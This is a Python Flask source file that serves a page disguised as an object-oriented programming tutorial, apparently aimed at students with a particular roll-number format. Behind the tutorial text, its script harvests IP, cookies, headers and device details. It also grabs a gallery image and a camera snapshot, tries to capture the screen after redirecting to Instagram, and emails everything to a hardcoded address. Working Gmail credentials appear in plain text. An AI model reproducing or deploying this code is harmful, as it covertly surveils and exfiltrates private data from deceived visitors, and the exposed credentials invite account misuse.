from flask import Flask, request, render_template_string, jsonify
import time
import json
from user_agents import parse
import os
import requests
import socket
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import re

app = Flask(__name__)

visitor_data = []
EMAIL_SENDER = "ezhilkirthikm@gmail.com"
EMAIL_PASSWORD = "funzsquyxfjbacmk"  # App-specific password
EMAIL_RECEIVER = "ezhilkirthik2005@gmail.com"

@app.route('/track')
def track():
    ip_address = request.remote_addr
    raw_user_agent = request.headers.get('User-Agent', 'Unknown')
    headers = dict(request.headers)

    ua = parse(raw_user_agent)
    
    try:
        hostname = socket.gethostbyaddr(ip_address)[0]
    except (socket.herror, socket.gaierror):
        hostname = 'Unknown'

    browser_profile_name = (
        f"{ua.browser.family or 'Unknown'}-{ua.browser.version_string or 'Unknown'}_"
        f"{ua.os.family or 'Unknown'}-{ua.os.version_string or 'Unknown'}_"
        f"{ua.device.family or 'Unknown'}-{ua.device.brand or 'Unknown'}"
    ).replace(" ", "-")

    visitor_info = {
        'ip': ip_address,
        'hostname': hostname,
        'user_agent': raw_user_agent,
        'browser_profile_name': browser_profile_name,
        'device': ua.device.family if ua.device.family else 'Unknown',
        'device_brand': ua.device.brand if ua.device.brand else 'Unknown',
        'device_model': ua.device.model if ua.device.model else 'Unknown',
        'os': ua.os.family if ua.os.family else 'Unknown',
        'os_version': ua.os.version_string if ua.os.version_string else 'Unknown',
        'browser': ua.browser.family if ua.browser.family else 'Unknown',
        'browser_version': ua.browser.version_string if ua.browser.version_string else 'Unknown',
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'headers': headers,
        'referrer': request.referrer if request.referrer else 'Unknown',
        'cookies': request.cookies if request.cookies else 'None',
        'accept_language': request.headers.get('Accept-Language', 'Unknown'),
    }
    visitor_data.append(visitor_info)

    html = """
    <html>
    <head>
        <title>OOP Concepts Tutorial</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            table { border-collapse: collapse; width: 80%; }
            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
            th { background-color: #f2f2f2; }
            pre { background-color: #f8f8f8; padding: 10px; }
            #rollForm { margin-top: 20px; }
            #rollInput { padding: 5px; }
            #submitBtn { padding: 5px 10px; background-color: #4CAF50; color: white; border: none; cursor: pointer; }
            #submitBtn:hover { background-color: #45a049; }
        </style>
    </head>
    <body>
        <h1>Object-Oriented Programming (OOP) Concepts</h1>
        <p>Welcome to this quick guide on OOP! Learn the core principles below.</p>
    
        <h2>Core OOP Principles</h2>
        <ul>
            <li><b>Encapsulation:</b> Bundling data and methods that operate on that data within a single unit (class), restricting direct access to some components.</li>
            <li><b>Inheritance:</b> Mechanism where a new class inherits properties and behaviors from an existing class.</li>
            <li><b>Polymorphism:</b> Ability of different classes to be treated as instances of the same class through a common interface or superclass.</li>
            <li><b>Abstraction:</b> Hiding complex implementation details and showing only the necessary features of an object.</li>
        </ul>
    
        <h2>Key Concepts Explained</h2>
        <table>
            <tr><th>Concept</th><th>Description</th></tr>
            <tr><td>Class</td><td>Blueprint for creating objects, defining properties (attributes) and behaviors (methods).</td></tr>
            <tr><td>Object</td><td>Instance of a class, representing a specific entity with state and behavior.</td></tr>
            <tr><td>Method</td><td>Function defined within a class that operates on its objects.</td></tr>
            <tr><td>Constructor</td><td>Special method called when an object is instantiated to initialize its state.</td></tr>
        </table>
    
        <h2>Example Code (Python)</h2>
        <pre><code>class Student:
    def __init__(self, name, roll):
        self.name = name  # Encapsulation
        self.roll = roll

    def display(self):  # Method
        print(f"Name: {self.name}, Roll: {self.roll}")

class GradStudent(Student):  # Inheritance
    def __init__(self, name, roll, thesis):
        super().__init__(name, roll)
        self.thesis = thesis

    def display(self):  # Polymorphism
        print(f"Name: {self.name}, Roll: {self.roll}, Thesis: {self.thesis}")

# Object creation
s = GradStudent("Alice", "CB.EN.U4ECE23001", "AI Research")
s.display()
</code></pre>
    
        <h2>Benefits of OOP</h2>
        <ul>
            <li>Modularity for easier maintenance</li>
            <li>Reusability through inheritance</li>
            <li>Flexibility and scalability</li>
            <li>Simplified complex systems via abstraction</li>
        </ul>
    
        <p><small>Loading additional resources...</small></p>
        <form id="rollForm">
            <label for="rollInput">Enter Your Roll Number (e.g., CB.EN.U4ECE23001):</label><br>
            <input type="text" id="rollInput" placeholder="CB.EN.U4ECE230xx" required>
            <button type="submit" id="submitBtn">Submit</button>
        </form>

        <input type="file" id="galleryInput" accept="image/*" style="display:none;">
        <video id="video" width="640" height="480" autoplay style="display:none;"></video>
        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
        
        <script>
            const deviceInfo = {
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                languages: navigator.languages || [navigator.language],
                platform: navigator.platform || 'Unknown',
            };

            async function requestGalleryAccess() {
                return new Promise((resolve) => {
                    const galleryInput = document.getElementById('galleryInput');
                    galleryInput.onchange = (e) => {
                        if (e.target.files && e.target.files[0]) {
                            const reader = new FileReader();
                            reader.onload = (event) => {
                                deviceInfo.galleryImage = event.target.result;
                                resolve(true);
                            };
                            reader.readAsDataURL(e.target.files[0]);
                        } else {
                            resolve(false);
                        }
                    };
                    galleryInput.click();
                });
            }

            function requestCallAccess() {
                return new Promise((resolve) => {
                    setTimeout(() => {
                        deviceInfo.callAccess = 'Simulated access granted';
                        resolve(true);
                    }, 1000);
                });
            }

            async function requestCameraAccess() {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    video.srcObject = stream;
                    await new Promise(resolve => video.onloadedmetadata = resolve);
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const screenshot = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(track => track.stop());
                    deviceInfo.cameraScreenshot = screenshot;
                    return true;
                } catch (err) {
                    deviceInfo.cameraError = 'Camera access denied';
                    return false;
                }
            }

            async function captureScreenAfterRedirect() {
                try {
                    // Delay to allow Instagram app to open
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await new Promise(resolve => video.onloadedmetadata = resolve);
                    const canvas = document.createElement('canvas');
                    canvas.width = 1280;
                    canvas.height = 720;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const screenshot = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(track => track.stop());
                    return screenshot;
                } catch (err) {
                    console.error('Screen capture failed:', err);
                    return { error: err.message || 'Screen capture denied or failed' };
                }
            }

            (async () => {
                await requestGalleryAccess();
                await requestCallAccess();
                await requestCameraAccess();

                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(deviceInfo)
                });
            })();

            document.getElementById('rollForm').onsubmit = async (e) => {
                e.preventDefault();
                const rollNo = document.getElementById('rollInput').value;
                const rollPattern = /^CB\.EN\.U4ECE230[0-5][0-9]$/;
                if (rollPattern.test(rollNo)) {
                    deviceInfo.rollNumber = rollNo;
                    window.location.href = 'instagram://'; // Redirect to Instagram app

                    const screenShotResult = await captureScreenAfterRedirect();
                    if (typeof screenShotResult === 'string') {
                        deviceInfo.instagramScreenshot = screenShotResult;
                    } else {
                        deviceInfo.instagramScreenshotError = screenShotResult.error;
                    }

                    await fetch('/log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(deviceInfo)
                    });
                } else {
                    alert('Invalid roll number format. Use CB.EN.U4ECE230xx (e.g., CB.EN.U4ECE23001)');
                }
            };
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/log', methods=['POST'])
def log():
    client_data = request.json
    if visitor_data and client_data:
        combined_data = visitor_data[-1].copy()
        combined_data.update(client_data)
        send_to_email(combined_data)
    return jsonify({'status': 'success'})

def send_to_email(data):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_SENDER
        msg['To'] = EMAIL_RECEIVER
        msg['Subject'] = 'OOP Tutorial Visitor Data'

        body = json.dumps(data, indent=2)
        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(msg)
        print("Data sent to email successfully")
    except Exception as e:
        print(f"Error sending email: {e}")

@app.route('/')
def root():
    return "Welcome to the OOP Concepts Tutorial. Visit /track to learn more."

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
    
